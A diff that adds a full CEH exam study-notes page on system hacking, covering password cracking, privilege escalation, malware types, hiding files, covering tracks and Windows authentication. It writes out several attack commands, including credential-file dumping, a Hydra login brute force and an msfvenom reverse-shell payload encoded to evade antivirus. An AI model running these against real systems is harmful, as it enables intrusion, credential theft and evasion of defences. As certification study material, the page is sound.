@@ -1,10 +1,501 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Module 6: System Hacking - CEH v13 Study Notes</title><meta name="robots" content="index, follow"><link rel="canonical" href="https://cehstudy.com/module6.html">
-<style>*{margin:0;padding:0;box-sizing:border-box}:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--text:#c9d1d9;--text2:#8b949e;--accent:#58a6ff;--accent2:#1f6feb;--border:#30363d}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.7}.container{max-width:900px;margin:0 auto;padding:0 20px}header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 20px}.header-inner{display:flex;justify-content:space-between;align-items:center}.back-link{color:var(--accent);text-decoration:none;font-size:.9rem;display:flex;align-items:center;gap:4px}.back-link:hover{text-decoration:underline}.study-btn{color:var(--accent);text-decoration:none;font-size:.9rem;padding:6px 14px;border:1px solid var(--accent);border-radius:6px}.study-btn:hover{background:var(--accent2);border-color:var(--accent)}main{padding:30px 0}.module-title{font-size:1.8rem;font-weight:700;margin-bottom:8px}.section-block{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:24px;margin-bottom:16px}.section-block h3{font-size:1.2rem;color:var(--accent);margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}.section-block h4{color:var(--text);margin:16px 0 8px;font-size:1rem}.section-block p,.section-block ul,.section-block ol{color:var(--text2);margin-bottom:12px}.section-block li{margin-bottom:6px}.section-block strong{color:var(--text)}footer{text-align:center;padding:30px 0;color:var(--text2);font-size:.85rem;border-top:1px solid var(--border);margin-top:40px}footer a{color:var(--accent);text-decoration:none}</style></head>
-<body><header><div class="container"><div class="header-inner"><a href="index.html" class="back-link">&#8592; CEH Study Flashcards</a><a href="index.html" class="study-btn">&#127891; Study Flashcards</a></div></div></header>
-<div class="container"><main><h1 class="module-title">Module 6: System Hacking</h1>
-<section class="section-block"><h3>Section 1: Gaining Access &amp; Privilege Escalation</h3><p>System hacking involves gaining access to systems and escalating privileges.</p><h4>Password Cracking</h4><p>The process of recovering passwords from data stored in scrambled form. Common methods include brute-force, dictionary attacks, and rainbow tables.</p><h4>Privilege Escalation</h4><p>Exploiting a bug, design flaw, or configuration oversight to gain elevated access.</p></section>
-</main></div>
-<footer><div class="container"><p>Built for the CEH community. Study smart, pass your exam.</p><p style="margin-top:8px"><a href="index.html">cehstudy.com</a> &middot; Not affiliated with EC-Council</p></div></footer>
-</body></html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 6: System Hacking - CEH v13 Study Notes</title>
+    <meta name="description" content="CEH v13 Module 6 study notes: system hacking, password cracking, privilege escalation, hiding files, covering tracks, executing applications, Linux basics, Microsoft authentication.">
+    <meta name="keywords" content="CEH module 6, system hacking, password cracking, privilege escalation, Meterpreter, msfvenom, covering tracks, NTLM, Kerberos, CEH v13 study notes">
+    <meta name="author" content="Chris Pardue">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://cehstudy.com/module6.html">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--text:#c9d1d9;--text2:#8b949e;--accent:#58a6ff;--accent2:#1f6feb;--border:#30363d}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.7}
+        .container{max-width:900px;margin:0 auto;padding:0 20px}
+        header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 20px}
+        .header-inner{display:flex;justify-content:space-between;align-items:center}
+        .back-link{color:var(--accent);text-decoration:none;font-size:.9rem;display:flex;align-items:center;gap:4px}
+        .back-link:hover{text-decoration:underline}
+        .study-btn{color:var(--accent);text-decoration:none;font-size:.9rem;padding:6px 14px;border:1px solid var(--accent);border-radius:6px;transition:all .15s}
+        .study-btn:hover{background:var(--accent2);border-color:var(--accent)}
+        main{padding:30px 0}
+        .module-title{font-size:1.8rem;font-weight:700;margin-bottom:8px}
+        .section-block{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:24px;margin-bottom:16px}
+        .section-block h3{font-size:1.2rem;color:var(--accent);margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+        .section-block h4{color:var(--text);margin:16px 0 8px;font-size:1rem}
+        .section-block p{color:var(--text2);margin-bottom:12px}
+        .section-block ul,.section-block ol{color:var(--text2);margin:0 0 12px 24px}
+        .section-block li{margin-bottom:6px}
+        .section-block strong{color:var(--text)}
+        .section-block code{background:var(--bg3);padding:2px 6px;border-radius:3px;font-size:.9em}
+        .section-block pre{background:var(--bg3);padding:12px;border-radius:6px;overflow-x:auto;margin:12px 0}
+        .section-block pre code{background:none;padding:0}
+        .section-block blockquote{border-left:3px solid var(--accent);padding-left:16px;margin:12px 0;color:var(--text2);font-style:italic}
+        footer{text-align:center;padding:30px 0;color:var(--text2);font-size:.85rem;border-top:1px solid var(--border);margin-top:40px}
+        footer a{color:var(--accent);text-decoration:none}
+    </style>
+</head>
+<body>
+    <header><div class="container"><div class="header-inner">
+        <a href="index.html" class="back-link">&#8592; CEH Study Flashcards</a>
+        <a href="index.html" class="study-btn">&#127891; Study Flashcards</a>
+    </div></div></header>
+    <div class="container">
+        <main>
+            <h1 class="module-title">Module 6: System Hacking</h1>
+
+            <section class="section-block"><h3>Section 1: Password Cracking Overview</h3>
+                <p><strong>Password cracking</strong> = recovering passwords from transmitted or stored data on computer systems.</p>
+                <h4>Password Attack Types</h4>
+
+                <h4>Non-Electronic Attacks</h4>
+                <ul>
+                    <li><strong>Dumpster diving:</strong> Looking for notes or anything that can help in cracking the password</li>
+                    <li><strong>Shoulder surfing:</strong> Observing the target while they type their passwords (looking at keyboard or screen)</li>
+                    <li><strong>Social engineering:</strong> Interacting with the target to trick them into revealing passwords</li>
+                </ul>
+
+                <h4>Active Online Attacks</h4>
+                <p>Require the attacker to communicate with the target machine to crack the password. E.g., trying to login with username-password combinations on an online login page.</p>
+                <ul>
+                    <li>Network communication to server over internet takes long time</li>
+                    <li>Rate limits exist (locked after 5 min, then 10, then 15)</li>
+                    <li>If server detects a bot, it may shut you off directly</li>
+                    <li>Offline attacks can perform millions/billions per second vs. online attacks (~every 5 seconds with lockout risk)</li>
+                </ul>
+
+                <h4>Passive Online Attacks</h4>
+                <p>Grabbing data in-transit (e.g., a key, password hash) without communicating with the target machine.</p>
+                <ol>
+                    <li>Attacker monitors the communication channel</li>
+                    <li>Records the traffic data</li>
+                    <li>Uses the data to break into the system</li>
+                </ol>
+
+                <h4>Offline Attacks</h4>
+                <p>Cracking efforts on a separate system where the attacker never attempts to login to the application server. Does not mean disconnected from internet. Usually the attacker tries to guess a password from a hash dump (e.g., SAM file on Windows or <code>/etc/shadow</code> on Linux).</p>
+            </section>
+
+            <section class="section-block"><h3>Section 2: Online Attack Techniques</h3>
+                <h4>Dictionary Attack</h4>
+                <p><strong>Dictionary</strong> = file containing list of passwords. Steps: Load a dictionary file into a password cracking program, then the program checks passwords against user accounts.</p>
+                <ul>
+                    <li>Helps test against default passwords, common/weak passwords, and leaks downloaded from internet</li>
+                    <li>Can get too big; no guarantee to find the password</li>
+                </ul>
+
+                <h4>Brute-Force Attack</h4>
+                <p>Running every combination of characters until the password is cracked. Slowest technique but comprehensive. Should be used in combination with rule-based attack to increase speed.</p>
+
+                <h4>Hybrid Attack</h4>
+                <p>Dictionary attack + brute force attack. Taking a dictionary and expanding it with guesses using brute-force (prepends, appends or substitutes characters in words).</p>
+                <p>Example using <code>hashcat</code>: If <code>example.dict</code> contains <code>password</code> and <code>hello</code>, then <code>-a 6 example.dict ?d?d</code> would generate from <code>password00</code> to <code>password99</code> and <code>hello00</code> to <code>hello99</code>.</p>
+
+                <h4>Rule-Based Attack</h4>
+                <p>Used when the attacker has some information about the password (length, digits, etc.). Combines several attacks (brute force, dictionary, syllable attack). Can record people or use other non-electronic attacks to get portions of the password to build rules.</p>
+
+                <h4>Password Guessing</h4>
+                <ol>
+                    <li>Find the target's username</li>
+                    <li>Create a password dictionary list (add default passwords from manufacturers)</li>
+                    <li>Sort passwords by probability</li>
+                    <li>Try each password</li>
+                </ol>
+
+                <h4>Trojan/Spyware/Keylogger</h4>
+                <p>Installed in target machine to get passwords and usernames. Run in background and sometimes difficult to detect.</p>
+                <ul>
+                    <li><strong>Trojans:</strong> Designed to collect information or harm the system; allow remote access</li>
+                    <li><strong>Spyware:</strong> Designed to collect secret information</li>
+                    <li><strong>Keyloggers:</strong> Send keystrokes to the attacker</li>
+                </ul>
+
+                <h4>Hash Injection</h4>
+                <p>Attack on systems that use hash functions for user authentication.</p>
+                <ol>
+                    <li>Retrieve hashes stored in databases</li>
+                    <li>Find the hash belonging to the user</li>
+                    <li>Use that hash to create an authenticated session</li>
+                </ol>
+
+                <h4>LLMNR/NBT-NS Poisoning</h4>
+                <p>LLMNR = Link Local Multicast Name Resolution; NBT-NS = NetBIOS Name Service. Two main Windows OS elements for host name resolution.</p>
+                <ul>
+                    <li>When DNS fails to resolve name queries, the host sends a UDP broadcast asking hosts to authenticate</li>
+                    <li>Attacker listens for broadcasts and tricks the host into establishing a connection</li>
+                    <li>Once connected, host sends username and NTLMv2 hash which attacker cracks to discover password</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 3: Passive &amp; Offline Attack Techniques</h3>
+                <h4>Wire Sniffing</h4>
+                <p>Attackers sniff credentials by capturing packets being transmitted. During transmission, attackers capture packets and extract sensitive information such as passwords and emails.</p>
+
+                <h4>Man-in-the-Middle (MITM) Attack</h4>
+                <p>Attacker gains access to the communication channel between target and server, then extracts information and data to gain unauthorized access.</p>
+
+                <h4>Replay Attack</h4>
+                <p>Involves using a sniffer to capture packets and authentication tokens. Need access to raw network data via:</p>
+                <ul>
+                    <li>Network tap to physically copy everything going through the network</li>
+                    <li>MITM attack using e.g., ARP poisoning</li>
+                    <li>Malware on victim's computer</li>
+                </ul>
+                <p>Attacker replays extracted authentication token or hashed password.</p>
+                <h4>Countermeasure</h4>
+                <p>Using Session ID for each user session on server side; expire session ID in short time intervals so replay attack cannot use same session ID.</p>
+
+                <h4>Distributed Network Attack (DNA)</h4>
+                <p>Uses the power of machines across the network to decrypt passwords. DNA manager is installed on a central location, coordinating the attack by allocating portions of the key search to machines on the network.</p>
+
+                <h4>Hash Attacks</h4>
+                <ul>
+                    <li>Rainbow table attack</li>
+                    <li>Collision attack</li>
+                    <li>Birthday attack</li>
+                    <li>Brute-force attack</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 4: Password Cracking Countermeasures</h3>
+                <h4>Password Salting</h4>
+                <p>The longer the random string, the harder it becomes to break or crack the password. Generates different hashes for the same password. Protects against rainbow tables by making the table much bigger.</p>
+
+                <h4>Key Stretching</h4>
+                <p>Used to derive stronger passwords to use in encryption.</p>
+
+                <h4>Linux Password Security</h4>
+                <p>Linux hashed passwords lie in <code>/etc/shadow</code> so attackers can target that. Linux usually uses SHA512; you can find the method in <code>/etc/login.defs</code>. In older systems, password information was stored in <code>/etc/passwd</code>, now it holds only user account information.</p>
+            </section>
+
+            <section class="section-block"><h3>Section 5: Password Cracking Tools</h3>
+                <h4>Crunch</h4>
+                <p>Generates password dictionaries.</p>
+                <pre><code>crunch &lt;min-length&gt; &lt;max-length&gt; &lt;character-pool&gt; -o &lt;file-name&gt;</code></pre>
+                <p>Difficulty/time grows exponentially, not linearly. E.g., <code>crunch 4 16 abcekfeafkapeo434@*.</code> generates thousands of petabytes.</p>
+
+                <h4>John the Ripper (JtR)</h4>
+                <p>Auto-detects OS password based on dictionary or brute-force attacks. Tries different passwords and compares their hashes to OS password. Supports Windows, Linux and macOS.</p>
+                <h4>Usage</h4>
+                <ol>
+                    <li>Dump OS password to a file: <code>unshadow /etc/passwd /etc/shadow &gt; mypasswd</code></li>
+                    <li>Crack password file: <code>john mypasswd</code></li>
+                    <li>Passwords are saved in <code>$JOHN/john.pot</code>. Run <code>john --show mypasswd</code> to see cracked passwords.</li>
+                </ol>
+
+                <h4>Hydra (THC-Hydra)</h4>
+                <p>Fast network login cracker for different protocols such as HTTP, Cisco, MySQL. Supports brute-force and dictionary attacks against SSH, FTP, HTTP, SMB, and many other protocols.</p>
+                <pre><code>hydra -L usernamelist.txt -P passlist.txt -e ns -F -t 1 -w 10 &lt;host-ip&gt; http-form-post "/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed" -v</code></pre>
+                <ul>
+                    <li><code>-e ns</code>: Additional options — <code>n</code> try null (empty password), <code>s</code> try same password as username</li>
+                    <li><code>-t 1</code>: Number of tasks (default is 16). Too many connections = detected immediately</li>
+                    <li><code>-w 10</code>: Waiting time of 10 ms</li>
+                    <li><code>Login failed</code>: Text to search in result page to determine whether login has failed</li>
+                </ul>
+
+                <h4>Hashcat</h4>
+                <p>Very fast, GPU-based password cracker with in-kernel rule engine. Can do dictionary hash attack, brute force hash, role based attack and more.</p>
+                <pre><code>./hashcat64.bin -a 3 -m 1800 ?u?l?l?l?d?d?d</code></pre>
+                <ul>
+                    <li><code>-m 1800</code>: Hash mode SHA512crypt (Unix)</li>
+                    <li><code>-a 3 ?u?l?l?l?d?d?d</code>: Mask attack — uppercase + lowercase + lowercase + lowercase + number + number + number</li>
+                </ul>
+
+                <h4>Cain &amp; Abel</h4>
+                <p>Password recovery tool for Windows that can recover passwords by sniffing, brute force, cryptanalysis, and other attacks.</p>
+
+                <h4>OphCrack</h4>
+                <p>Free Windows password cracker based on rainbow tables. Requires a Windows machine to run the target SAM database dump or the tool directly on the Windows system.</p>
+
+                <h4>Other Tools</h4>
+                <ul>
+                    <li><strong>Elcomsoft Distributed Password Recovery:</strong> Data recovery and password recovery services for Windows. Forensic and government agencies.</li>
+                    <li><strong>Passware Kit Forensic:</strong> Encrypted electronic evidence discovery and decryption. Can crack passwords for Windows, Unix, Mac OS and many more.</li>
+                    <li><strong>chntpw (Offline NT Password &amp; Registry Editor):</strong> Linux utility for resetting or blanking local passwords used by Windows.</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 6: Escalating Privileges</h3>
+                <p><strong>Privilege escalation</strong> = exploiting OS and software vulnerabilities to gain admin privileges by executing malicious code that grants higher privileges.</p>
+                <h4>Types</h4>
+                <ul>
+                    <li><strong>Horizontal privilege escalation:</strong> Acquiring the privileges of the same level — allows executing files from a protected location</li>
+                    <li><strong>Vertical privilege escalation:</strong> Acquiring higher privileges</li>
+                </ul>
+
+                <h4>Privilege Escalation Techniques</h4>
+                <ul>
+                    <li><strong>Path Interception:</strong> Creating files at paths to be executed instead of legitimate targets (exploits misconfigurations, quotes, search orders)</li>
+                    <li><strong>Web Shell:</strong> Installed as backdoor to control from a remote server</li>
+                    <li><strong>setuid and setgid:</strong> Setting them allows executing files with more privileges than user in macOS and Linux</li>
+                </ul>
+
+                <h4>Pivoting</h4>
+                <p>Using a compromised system as a launching point into other systems. E.g., in Metasploit you can add route to first compromised system to access the network beyond it.</p>
+
+                <h4>Windows Techniques</h4>
+                <ul>
+                    <li><strong>Access token manipulation:</strong> Access tokens are used as security context of a process. Users can modify tokens so processes seem to belong another user (e.g., "run as" administrator)</li>
+                    <li><strong>File system permissions weakness:</strong> Original binaries can be replaced with malicious ones</li>
+                    <li><strong>Windows application shimming:</strong> Exploiting Windows Application Compatibility Framework to bypass UAC, inject DLLs, capture memory addresses</li>
+                    <li><strong>DLL vulnerability:</strong> Failure to supply fully qualified path of a DLL — placing a malicious DLL into the execution directory</li>
+                    <li><strong>Scheduled tasks:</strong> Used to escalate privileges, maintain persistence, start at startup</li>
+                </ul>
+
+                <h4>macOS Techniques</h4>
+                <ul>
+                    <li><strong>Dynamic library vulnerability:</strong> Injecting malicious dylibs into primary directories</li>
+                    <li><strong>Launch Daemon:</strong> Execute malicious files at boot-up time</li>
+                </ul>
+
+                <h4>Meltdown &amp; Spectre Vulnerabilities</h4>
+                <ul>
+                    <li><strong>Meltdown:</strong> Affects some Intel chips. Bypasses security mechanisms preventing programs from reading arbitrary memory locations. Allows reading credentials, private keys.</li>
+                    <li><strong>Spectre:</strong> Affects modern microprocessors. Tricks programs into accessing their memory space. Allows reading kernel memory via JavaScript web-based attacks.</li>
+                </ul>
+
+                <h4>Countermeasures</h4>
+                <ul>
+                    <li>Apply least-privilege: Never grant more privileges than needed!</li>
+                    <li>Use encryption and MFA</li>
+                    <li>Run services as unprivileged accounts</li>
+                    <li>Patch and update regularly</li>
+                    <li>Ensure all executables are write-protected</li>
+                </ul>
+
+                <h4>User Access Control (UAC)</h4>
+                <p>Prompts user for potentially dangerous software in Windows. Limits software to user privileges until an administrator authorizes elevation. Should be set to "Always Notify."</p>
+
+                <h4>Privilege Escalation Tools</h4>
+                <ul>
+                    <li><a href="https://github.com/AlessandroZ/BeRoot" target="_blank"><strong>BeRoot:</strong></a> Check common misconfigurations to find privilege escalation on Linux and Windows</li>
+                    <li><a href="https://github.com/reider-roque/linpostexp" target="_blank"><strong>linpostexp:</strong></a> Linux post-exploitation enumeration and exploit checking</li>
+                    <li><strong>Windows Exploit Suggester</strong> and <strong>Linux Exploit Suggester</strong></li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 7: Executing Applications</h3>
+                <p>Remotely executing malicious programs designed to steal information, crack passwords, install backdoor, etc. Programs attackers install include:</p>
+                <ul>
+                    <li><strong>Backdoors:</strong> Collect information and gain unauthorized access</li>
+                    <li><strong>Crackers:</strong> Crack passwords</li>
+                    <li><strong>Keyloggers:</strong> Record keystrokes</li>
+                    <li><strong>Spyware:</strong> Capture screenshots</li>
+                </ul>
+
+                <h4>Keylogger</h4>
+                <p>Software or hardware device designed to record every keystroke, log them to a file, and send them to a remote location.</p>
+                <h4>Hardware Keylogger Types</h4>
+                <ul>
+                    <li><strong>PC/BIOS Embedded:</strong> Modifying BIOS firmware to capture keystrokes</li>
+                    <li><strong>Keylogger keyboard:</strong> Hardware circuit attached with keyboard cable connector</li>
+                    <li><strong>External keylogger:</strong> Placed between keyboard and computer (PS/2, USB, Bluetooth, Wi-Fi)</li>
+                </ul>
+                <h4>Software Keylogger Types</h4>
+                <ul>
+                    <li><strong>Application keylogger:</strong> Records emails, passwords, messages, browsing activities</li>
+                    <li><strong>Kernel keylogger:</strong> Exists at kernel level as keyboard device driver</li>
+                    <li><strong>Rootkit keylogger:</strong> Forged Windows device driver recording keystrokes</li>
+                    <li><strong>Device driver keylogger:</strong> Replaces the driver with keylogging functionality</li>
+                    <li><strong>Hypervisor-based keylogger:</strong> Works within a malware hypervisor on the OS</li>
+                    <li><strong>Form grabbing keylogger:</strong> Records web browsing when Submit event is triggered</li>
+                </ul>
+
+                <h4>Spyware</h4>
+                <p>Stealthy program designed to record the target's interaction with the computer and Internet, send recorded data to the attacker. Able to take and send screenshots.</p>
+                <h4>Types</h4>
+                <ul>
+                    <li>Desktop, Email, Internet, Child-monitoring, Screen-capturing, USB, Audio/video, Print, Telephone, GPS spyware</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 8: Hiding Files</h3>
+                <h4>Rootkits</h4>
+                <p>Create backdoor to the system. Hide themselves by removing from process list, replacing system calls and utilities. Do not spread by themselves — usually hidden in other software.</p>
+                <h4>Rootkit Levels</h4>
+                <ul>
+                    <li><strong>Hypervisor level:</strong> Acts as hypervisor and loads target OS as virtual machine</li>
+                    <li><strong>Hardware/firmware:</strong> Conceals in hardware devices (e.g., motherboard firmware)</li>
+                    <li><strong>Kernel level:</strong> Replaces portions of OS code or adds malicious core (ring 0)</li>
+                    <li><strong>Boot loader level:</strong> Replaces original bootloader</li>
+                    <li><strong>Application level:</strong> Changes behavior of target application</li>
+                    <li><strong>Library level:</strong> Replaces original system calls to hide attacker's activities</li>
+                </ul>
+
+                <h4>Bootkit</h4>
+                <p>Kernel-mode rootkit that runs every time computer boots. Can bypass code signing by attaching itself to the master boot record (MBR).</p>
+
+                <h4>NTFS Alternate Data Streams (ADS)</h4>
+                <p>NTFS stores two data streams: file metadata and file data. ADS is not in the file but attached through the Master File Table. Contains metadata such as author, access, word count. Hard to detect because file size and contents remain the same.</p>
+
+                <h4>GUI Hiding</h4>
+                <ul>
+                    <li><strong>Linux/macOS:</strong> Prepend single dot (.) in filenames</li>
+                    <li><strong>Windows:</strong> Uses hidden file attribute (<code>ATTRIB +H</code>)</li>
+                </ul>
+
+                <h4>Steganography</h4>
+                <p>Technique which hides a message within another message. E.g., an image that is preserved but with embedded data. Used by attackers to hide keyloggers or insert source code for hacking tools.</p>
+                <h4>Steganalysis (Discovering hidden data)</h4>
+                <ul>
+                    <li><strong>Stego only attack:</strong> Only the stego-object is available</li>
+                    <li><strong>Known stego attack:</strong> Algorithm known, both original and stego-object available</li>
+                    <li><strong>Known message attack:</strong> Hidden message and stego-image are known</li>
+                    <li><strong>Known cover attack:</strong> Stego-object compared with original cover object</li>
+                    <li><strong>Chosen message attack:</strong> Generate stego-object from chosen message to find patterns</li>
+                    <li><strong>Chosen stego attack:</strong> Algorithm and stego-object known</li>
+                </ul>
+                <h4><code>steghide</code></h4>
+                <pre><code>steghide embed -cf test.jpg -ef hide-me.txt
+steghide extract -sf test.jpg</code></pre>
+
+                <h4>Packing Malware / msfvenom</h4>
+                <p>Embedding malware in other files (PDF, JPEG) to make it hidden. <code>msfvenom</code> combines payload generation and encoding.</p>
+                <pre><code>msfvenom -a x86 --platform Windows -x /root/Downloads/someProgram.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.122.110 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o program.exe</code></pre>
+                <ul>
+                    <li><code>-x</code>: Executable to patch (inject)</li>
+                    <li><code>-k</code>: Keep functionality in the program</li>
+                    <li><code>-p</code>: Payload to inject (reverse shell in example)</li>
+                    <li><code>-e</code>: Encoder to avoid antivirus detection</li>
+                    <li><code>-i 3</code>: Encode 3 times for more stealth</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 9: Covering Tracks</h3>
+                <p>Attempt to hide attacker's presence on the system so it appears uncompromised. To avoid detection, modify system logs and delete activity during the attack.</p>
+                <h4>Security Logs</h4>
+                <h4>Windows Security Logs</h4>
+                <p>Event logs stored in <code>C:\Windows\System32\winevt\Logs</code>. Can use Windows Event Viewer to navigate. Categorized as application, security, and system.</p>
+                <h4>Linux Security Logs</h4>
+                <ul>
+                    <li><code>/var/log/messages</code> or <code>/var/log/syslog</code> (Debian): Generic system activity</li>
+                    <li><code>/var/log/auth.log</code> (Debian/Ubuntu) | <code>/var/log/secure</code> (RedHat/CentOS): Authentication events</li>
+                    <li><code>/var/log/utmp</code>, <code>/var/log/wtmp</code>, <code>/var/log/btmp</code>, <code>/var/log/faillog</code>: Login/logout events</li>
+                    <li><code>/var/log/lastlog</code>: Last login time</li>
+                    <li><code>/var/log/cron</code>: Cron service logs</li>
+                </ul>
+
+                <h4>Techniques of Covering Tracks</h4>
+                <ul>
+                    <li><strong>Disabling auditing:</strong> Disabling logging features (usually requires restart)</li>
+                    <li><strong>Clearing logs:</strong> Deleting logged activities (suspicious if all logs deleted)</li>
+                    <li><strong>Manipulating logs:</strong> Changing logs to prevent detection (e.g., search and replace IP)</li>
+                </ul>
+
+                <h4>Covering Tracks on Network</h4>
+                <ul>
+                    <li><strong>Reverse shell:</strong> Target system sends request to remote system for commands</li>
+                    <li><strong>DNS tunneling:</strong> Adding data payload to DNS server to create back channel</li>
+                    <li><strong>TCP parameters:</strong> Using TCP fields for payload distribution (IP ID, ACK number, sequence number)</li>
+                </ul>
+
+                <h4>Tools for Covering Tracks</h4>
+                <ul>
+                    <li><a href="https://privacy.sexy" target="_blank"><strong>Privacy.sexy:</strong></a> Online/offline tool to cleanup logs and personal activities</li>
+                    <li><strong>Auditpol:</strong> Microsoft tool to manipulate audit policies</li>
+                    <li><strong>MRU-blaster:</strong> Find and remove 30,000 MRU lists</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 10: Linux Basics for Ethical Hackers</h3>
+                <h4>Linux Folder Hierarchy</h4>
+                <ul>
+                    <li><code>/</code> — Root</li>
+                    <li><code>/var</code> — Variable Data / Log Files</li>
+                    <li><code>/bin</code> — Binaries / User Commands</li>
+                    <li><code>/sbin</code> — Sys Binaries / Admin Commands</li>
+                    <li><code>/root</code> — Home dir for root user</li>
+                    <li><code>/boot</code> — Store kernel</li>
+                    <li><code>/proc</code> — Direct access to kernel</li>
+                    <li><code>/dev</code> — Hardware storage devices</li>
+                    <li><code>/mnt</code> — Mount devices</li>
+                    <li><code>/etc</code> — System configuration files (passwords, firewall settings, hosts file)</li>
+                </ul>
+
+                <h4>File Permissions in Linux</h4>
+                <p>Permissions assigned via binary equivalent for each <code>rwx</code> group: read=4, write=2, execute=1.</p>
+                <p>Order: First number = user, second = group, third = others. E.g., <code>chmod 744 anyfile</code> allows all privileges to user, read-only for group and others.</p>
+
+                <h4>Running Processes in Background</h4>
+                <p>Using <code>&amp;</code> runs program in background. Program terminates on logout. Bring back with <code>fg &lt;job-number&gt;</code>.</p>
+
+                <h4>Essential Linux Commands for Hacking</h4>
+                <ul>
+                    <li><code>whoami</code>, <code>id</code>, <code>uname -a</code> — System info</li>
+                    <li><code>cat /etc/passwd</code>, <code>cat /etc/shadow</code> — User accounts</li>
+                    <li><code>sudo su</code> — Privilege escalation</li>
+                    <li><code>netstat -tulpn</code>, <code>ss -tulpn</code> — Network connections</li>
+                    <li><code>find / -perm -4000</code> — Find SUID binaries</li>
+                    <li><code>history</code> — Command history (saved in <code>.bash_history</code>)</li>
+                    <li><code>ps aux</code> — List all processes</li>
+                    <li><code>top</code> or <code>htop</code> — Real-time process viewer</li>
+                    <li><code>grep</code> — Search patterns in files</li>
+                    <li><code>find</code> — Search for files by name/content</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 11: Microsoft Authentication</h3>
+                <p>Windows stores passwords in hashed form using either:</p>
+                <ul>
+                    <li><strong>SAM Database:</strong> Stored at <code>%SystemRoot%/system32/config/SAM</code> — Locked by kernel, usually stolen via bootable CD/USB</li>
+                    <li><strong>Active Directory Database:</strong> On domain controller at <code>%SystemRoot%\NTDS\Ntds.dit</code></li>
+                </ul>
+
+                <h4>NTLM Authentication (New Technology LAN Manager)</h4>
+                <p>Challenge-response authentication protocol. Consists of LM and NTLM protocols. Each stores passwords in SAM using different hash methodologies.</p>
+
+                <h4>LM Hash (Legacy — Weak)</h4>
+                <ul>
+                    <li>Convert to uppercase, pad to 14 chars with NULL, split into two 7-char chunks</li>
+                    <li>Create DES keys, encrypt <code>"KGS!@#$%"</code>, concatenate = LM hash</li>
+                    <li><strong>Weaknesses:</strong> No salting, case-insensitive, max 14 chars, second half always <code>0xAAD3B435B51404EE</code> if password &lt; 7 chars</li>
+                    <li>Cracking: <code>john --format=lm hash.txt</code> or <code>hashcat -m 3000 -a 3 hash.txt</code></li>
+                </ul>
+
+                <h4>NTLM Hash</h4>
+                <p>Algorithm: <code>MD4(UTF-16-LE(password))</code>. Cracking: <code>john --format=netntlm hash.txt</code> or <code>hashcat -m 5500 -a 3 hash.txt</code></p>
+
+                <h4>NTLMv1</h4>
+                <ul>
+                    <li>Uses both NT and LM hash. Deprecated but still used in old systems.</li>
+                    <li><strong>Flow:</strong> Server sends 8-byte challenge &rarr; Client splits NTLM hash into three 7-byte parts &rarr; DES encrypt each with challenge &rarr; 24-byte response</li>
+                </ul>
+
+                <h4>NTLMv2</h4>
+                <ul>
+                    <li>Uses MD5. Stronger cryptography against spoofing.</li>
+                    <li><strong>Flow:</strong> Server challenge + Client challenge &rarr; HMAC-MD5 hash of NT-hash + username + domain &rarr; LMv2 and NTv2 computed &rarr; response = LMv2 | CC | NTv2 | CC*</li>
+                    <li>Cracking: <code>john --format=netntlmv2 hash.txt</code> or <code>hashcat -m 5600 -a 3 hash.txt</code></li>
+                </ul>
+
+                <h4>Pass the Hash Attack</h4>
+                <p>Allows gaining access without plaintext password. Exploits static hash shared between sessions. Can dump hashes from compromised machines using Windows Credentials Editor or Pass-the-Hash Toolkit, or sniff the network.</p>
+
+                <h4>Kerberos Authentication</h4>
+                <p>Network authentication protocol using TCP/UDP port 88. Protects against replay attacks and eavesdropping. Uses symmetric and asymmetric encryption. Mutual authentication via tickets.</p>
+                <h4>Components</h4>
+                <ul>
+                    <li><strong>KDC (Key Distribution Center):</strong> Authentication Server (AS) + Ticket Granting Server (TGS)</li>
+                    <li><strong>TGT (Ticket Granting Ticket):</strong> Encrypted file with limited validity, includes session key and user IP</li>
+                </ul>
+                <h4>Kerberos Flow</h4>
+                <ol>
+                    <li>Client asks KDC for ticket to authenticate</li>
+                    <li>Server responds with secret key (hashed TGT)</li>
+                    <li>TGT sent to server requesting TGS</li>
+                    <li>Server responds with ticket; client accesses network resources</li>
+                </ol>
+
+                <h4>Pass the Ticket Attack</h4>
+                <p>Authentication using Kerberos tickets without password access. Tickets retrieved from memory using tools like <a href="https://github.com/gentilkiwi/mimikatz" target="_blank">mimikatz</a> and <a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus</a>.</p>
+            </section>
+        </main>
+    </div>
+    <footer><div class="container">
+        <p>Built for the CEH community. Study smart, pass your exam.</p>
+        <p style="margin-top:8px"><a href="index.html">cehstudy.com</a> &middot; Not affiliated with EC-Council</p>
+    </div></footer>
+</body>
+</html>
